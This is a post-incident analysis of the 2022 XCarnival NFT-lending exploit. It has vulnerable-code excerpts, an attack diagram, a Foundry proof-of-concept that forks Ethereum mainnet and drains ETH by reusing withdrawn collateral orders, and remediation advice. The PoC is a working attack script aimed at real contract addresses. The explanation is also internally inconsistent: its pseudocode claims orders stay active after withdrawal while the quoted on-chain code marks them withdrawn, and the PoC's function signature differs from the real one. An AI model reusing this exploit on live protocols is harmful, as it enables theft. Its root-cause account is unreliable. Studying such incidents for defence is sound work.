# XCarnival — BAYC NFT Collateral Order State Reuse Attack Analysis

| Field | Details |
|------|------|
| **Date** | 2022-06-26 |
| **Protocol** | XCarnival NFT Lending Protocol |
| **Chain** | Ethereum Mainnet |
| **Loss** | 3,087 ETH (~$3,870,000) |
| **Attacker** | [0xb7cbb4d43f1e08327a90b32a8417688c9d0b800a](https://etherscan.io/address/0xb7cbb4d43f1e08327a90b32a8417688c9d0b800a) |
| **Attack Contract** | [0xf70f691d30ce23786cfb3a1522cfd76d159aca8d](https://etherscan.io/address/0xf70f691d30ce23786cfb3a1522cfd76d159aca8d) |
| **Vulnerable Contract** | XNFT [0xb14B3b9682990ccC16F52eB04146C3ceAB01169A](https://etherscan.io/address/b14B3b9682990ccC16F52eB04146C3ceAB01169A) |
| **Root Cause** | In `pledgeAndBorrow()`, after locking an NFT as collateral and generating an order ID, calling `withdrawNFT()` to reclaim the NFT still leaves the order ID valid, allowing repeated borrowing via `borrow()` |
| **PoC Source** | [DeFiHackLabs](https://github.com/SunWeb3Sec/DeFiHackLabs/blob/main/src/test/2022-06/XCarnival_exp.sol) |

---
## 1. Vulnerability Overview

XCarnival is a protocol that allows users to borrow ETH using blue-chip NFTs such as BAYC and MAYC as collateral. Users call `pledgeAndBorrow()` to deposit an NFT as collateral and borrow ETH.

The core vulnerability is that an `orderId` generated during `pledgeAndBorrow()` remains valid even after the NFT is reclaimed via `withdrawNFT()`. The attacker exploited BAYC #5110 as follows:

1. Call `pledgeAndBorrow(BAYC #5110, 0, ...)` — pledge NFT as collateral, borrow 0 ETH, generate orderId
2. Call `withdrawNFT(orderId)` — immediately reclaim the NFT
3. Transfer the reclaimed NFT to the next payload contract and repeat the same process
4. Call `borrow(36 ETH)` using each of the still-valid orderIds

Using 33 payload contracts, the attacker generated 33 orderIds and borrowed 36 ETH per orderId, draining over 1,188 ETH in total.

---
## 2. Vulnerable Code Analysis

```solidity
// ❌ Vulnerable XCarnival XNFT (pseudocode)
contract XNFT {
    struct Order {
        address nftAddress;
        uint256 tokenId;
        address borrower;
        uint256 borrowedAmount;
        bool    active;      // ❌ Remains active = true even after NFT is withdrawn
    }

    mapping(uint256 => Order) public orders;
    uint256 public orderCounter;

    // NFT collateral + borrow
    function pledgeAndBorrow(
        address nft,
        uint256 tokenId,
        uint256 borrowAmount,
        address xToken,
        uint256 minBorrow
    ) external returns (uint256 orderId) {
        // Receive NFT
        IERC721(nft).transferFrom(msg.sender, address(this), tokenId);

        // Generate orderId
        orderId = ++orderCounter;
        orders[orderId] = Order({
            nftAddress:    nft,
            tokenId:       tokenId,
            borrower:      msg.sender,
            borrowedAmount: 0,
            active:        true
        });

        // Execute borrow
        if (borrowAmount > 0) {
            IXToken(xToken).borrow(borrowAmount, msg.sender, orderId);
        }
    }

    function withdrawNFT(uint256 orderId) external {
        Order storage order = orders[orderId];
        require(order.borrower == msg.sender, "not borrower");
        require(order.borrowedAmount == 0, "debt exists");

        // ❌ NFT is returned but order.active remains true
        // → orderId is still recognized as valid collateral
        IERC721(order.nftAddress).transferFrom(
            address(this), msg.sender, order.tokenId
        );
        // order.active = false; // ← This line is missing!
    }

    // Allow borrowing if orderId is active
    function _borrow(uint256 orderId, uint256 amount) internal {
        Order storage order = orders[orderId];
        require(order.active, "order not active"); // ❌ Passes even without NFT
        require(order.borrower == msg.sender, "not borrower");

        order.borrowedAmount += amount;
        // Disburse ETH
        payable(msg.sender).transfer(amount);
    }
}

// ✅ Correct pattern: deactivate order upon NFT withdrawal
contract XNFTFixed {
    function withdrawNFT(uint256 orderId) external {
        Order storage order = orders[orderId];
        require(order.borrower == msg.sender, "not borrower");
        require(order.borrowedAmount == 0, "debt exists");

        // ✅ Deactivate order simultaneously with NFT return
        order.active = false;  // ← Key fix

        IERC721(order.nftAddress).safeTransferFrom(
            address(this), msg.sender, order.tokenId
        );
    }
}
```

---
### On-Chain Original Code

Source: Sourcify verified


**XNFT.sol** — Entry point / Vulnerable location:
```solidity
// ❌ Root cause: In `pledgeAndBorrow()`, after locking an NFT as collateral and generating an order ID, calling `withdrawNFT()` to reclaim the NFT still leaves the order I
    function pledgeAndBorrow(address _collection, uint256 _tokenId, uint256 _nftType, address xToken, uint256 borrowAmount) external nonReentrant {  // ❌ Vulnerability
        uint256 orderId = pledgeInternal(_collection, _tokenId, _nftType);
        IXToken(xToken).borrow(orderId, payable(msg.sender), borrowAmount);
    }

    function withdrawNFT(uint256 orderId) external nonReentrant whenNotPaused(2){  // ❌ Vulnerability
        LiquidatedOrder storage liquidatedOrder = allLiquidatedOrder[orderId];
        Order storage _order = allOrders[orderId];
        if(isOrderLiquidated(orderId)){
            require(liquidatedOrder.auctionWinner == address(0), "the order has been withdrawn");
            require(!allLiquidatedOrder[orderId].isPledgeRedeem, "redeemed by the pledgor");
            CollectionNFT memory collectionNFT = collectionWhiteList[_order.collection];
            uint256 auctionDuration;
            if(collectionNFT.auctionDuration != 0){
                auctionDuration = collectionNFT.auctionDuration;
            }else{
                auctionDuration = auctionDurationOverAll;
            }
            require(block.timestamp > liquidatedOrder.liquidatedStartTime.add(auctionDuration), "the auction is not yet closed");
            require(msg.sender == liquidatedOrder.auctionAccount || (liquidatedOrder.auctionAccount == address(0) && msg.sender == liquidatedOrder.liquidator), "you can't extract NFT");
    // ... (truncated)
                doTransferOut(liquidatedOrder.xToken, payable(liquidatedOrder.liquidator), liquidatorAmount);

                addUpIncomeMap[liquidatedOrder.xToken] = addUpIncomeMap[liquidatedOrder.xToken] + (profit - compensatePledgerAmount - liquidatorAmount);
            }
            liquidatedOrder.auctionWinner = msg.sender;
        }else{
            require(!_order.isWithdraw, "the order has been drawn");
            require(_order.pledger != address(0) && msg.sender == _order.pledger, "withdraw auth failed");
            uint256 borrowBalance = controller.getOrderBorrowBalanceCurrent(orderId);
            require(borrowBalance == 0, "order has debt");
            transferNftInternal(address(this), _order.pledger, _order.collection, _order.tokenId, _order.nftType);
        }
        _order.isWithdraw = true;
        emit WithDraw(_order.collection, _order.tokenId, orderId, _order.pledger, msg.sender);
    }
```

## 3. Attack Flow (ASCII Diagram)

```
Attacker (holds BAYC #5110)
    │
    ├─[1] BAYC #5110 → transfer to main attack contract
    │       BAYC.transferFrom(attacker, mainContract, 5110)
    │
    ├─[2] Deploy 33 Payload contracts
    │
    ├─[3] Repeat for each Payload (i = 1 ~ 33):
    │       │
    │       ├─ [3a] BAYC #5110 → transfer to Payload[i]
    │       │
    │       ├─ [3b] Payload[i]: XNFT.pledgeAndBorrow(BAYC, 5110, 0, ...)
    │       │         Lock NFT + generate orderId[i] (borrow 0 ETH)
    │       │
    │       ├─ [3c] Payload[i]: XNFT.withdrawNFT(orderId[i])
    │       │         Reclaim NFT ← ⚡ order[i].active remains true
    │       │
    │       └─ [3d] BAYC #5110 → transfer to next Payload[i+1]
    │
    ├─[4] Obtain 33 valid orderIds (NFT returned to attacker)
    │
    ├─[5] Call XToken.borrow(36 ETH) for each orderId
    │       orderId.active = true → collateral check passes
    │       → 33 * 36 ETH = 1,188 ETH borrowed
    │       (+ additional ETH from prior attacks)
    │
    └─[6] Total 3,087 ETH drained
              ~$3,870,000
```

---
## 4. PoC Code (Core Logic + Comments)

```solidity
// SPDX-License-Identifier: UNLICENSED
pragma solidity 0.8.10;

import "forge-std/Test.sol";

interface IXNFT {
    function counter() external returns (uint256);

    // NFT collateral + borrow (key: orderId generation)
    function pledgeAndBorrow(
        address nftAddress,
        uint256 tokenId,
        uint256 borrowAmount,
        address xToken,
        uint256 minBorrow
    ) external;

    // ⚡ NFT withdrawal — order.active is not set to false
    function withdrawNFT(uint256 orderId) external;
}

interface IXToken {
    // Allow borrow if orderId is valid
    function borrow(uint256 borrowAmount, address payable borrower, uint256 orderId) external;
}

interface IBAYC {
    function setApprovalForAll(address operator, bool approved) external;
    function transferFrom(address from, address to, uint256 tokenId) external;
    function ownerOf(uint256 tokenId) external view returns (address);
}

// Single attack payload contract
contract Payload {
    IBAYC baycNFT;
    IXNFT xnft;
    uint256 tokenId = 5110; // BAYC #5110

    constructor(address _bayc, address _xnft) {
        baycNFT = IBAYC(_bayc);
        xnft    = IXNFT(_xnft);
    }

    function attack(address xToken) external returns (uint256 orderId) {
        // Approve BAYC
        baycNFT.setApprovalForAll(address(xnft), true);

        // [1] Pledge NFT as collateral + generate orderId (borrow 0 ETH)
        xnft.pledgeAndBorrow(address(baycNFT), tokenId, 0, xToken, 0);
        orderId = xnft.counter();

        // [2] Immediately withdraw NFT — ⚡ orderId remains active
        xnft.withdrawNFT(orderId);

        // [3] Return NFT to next attacker
        baycNFT.transferFrom(address(this), msg.sender, tokenId);
    }
}

contract ContractTest is Test {
    IBAYC baycNFT = IBAYC(0xBC4CA0EdA7647A8aB7C2061c2E118A18a936f13D);
    IXNFT xnft    = IXNFT(0xb14B3b9682990ccC16F52eB04146C3ceAB01169A);
    IXToken xToken = IXToken(0x5417da20ac8157dd5c07230cfc2b226fdcfc5663);

    uint256 tokenId = 5110;

    function setUp() public {
        vm.createSelectFork("mainnet", 15_028_846);
    }

    function testExploit() public {
        emit log_named_decimal_uint("[Before] ETH", address(this).balance, 18);

        // Assign BAYC #5110 to attacker contract (handled via vm.prank in PoC)
        // In reality: attacker pre-purchases BAYC or borrows via flash loan

        uint256[] memory orderIds = new uint256[](33);

        // [Steps 1~33] Generate orderIds via 33 Payload contracts
        for (uint256 i = 0; i < 33; i++) {
            Payload payload = new Payload(address(baycNFT), address(xnft));

            // Transfer BAYC #5110 to payload
            baycNFT.transferFrom(address(this), address(payload), tokenId);

            // pledgeAndBorrow → withdrawNFT → return NFT
            orderIds[i] = payload.attack(address(xToken));
        }

        // [Borrow phase] Borrow 36 ETH each using 33 orderIds
        for (uint256 i = 0; i < 33; i++) {
            // ⚡ orderId has no NFT but active = true → borrow succeeds
            xToken.borrow(36 ether, payable(address(this)), orderIds[i]);
        }

        emit log_named_decimal_uint("[After] ETH stolen", address(this).balance, 18);
    }

    receive() external payable {}
}
```

---
## 5. Vulnerability Classification (Table)

| Category | Details |
|------|-----------|
| **Vulnerability Type** | State inconsistency reuse (Missing order deactivation) |
| **CWE** | CWE-841: Improper Enforcement of Behavioral Workflow |
| **OWASP DeFi** | orderId reuse after NFT collateral release |
| **Attack Vector** | `pledgeAndBorrow(0)` → `withdrawNFT()` → repeated orderId generation → `borrow()` |
| **Precondition** | Possession of 1 NFT (1 BAYC used to generate 33 orderIds) |
| **Impact** | 3,087 ETH drained from entire XToken pool |

---
## 6. Remediation Recommendations

1. **Immediate deactivation on NFT withdrawal**: When `withdrawNFT()` executes, always set `order.active = false` to invalidate the orderId of the withdrawn NFT.
2. **Checks-Effects-Interactions pattern**: Perform state changes (`order.active = false`) before external calls (NFT transfer).
3. **Verify NFT custody before borrowing**: Before executing `borrow()`, verify in real time that the contract currently holds the NFT associated with the order.
4. **Restrict same-block pledge-withdraw**: Block consecutive calls to `pledgeAndBorrow()` + `withdrawNFT()` within the same block.

---
## 7. Lessons Learned

- **Complexity of NFT collateral lending**: Lending protocols that use ERC721 NFTs as collateral require far more complex state management than ERC20-based protocols. The physical custody of an NFT and its logical state within the protocol must always remain consistent.
- **33-payload pattern**: The pattern of sequentially generating 33 orderIds with a single NFT is not a reentrancy attack but rather a "state reuse" attack.
- **$3.87M loss**: A large-scale loss from a relatively small NFT lending protocol, underscoring the security importance of blue-chip NFT collateral lending protocols.
- **BAYC #5110 returned**: After post-attack negotiations, the attacker returned 1,467 ETH to XCarnival and kept the remainder as a whitehat bounty.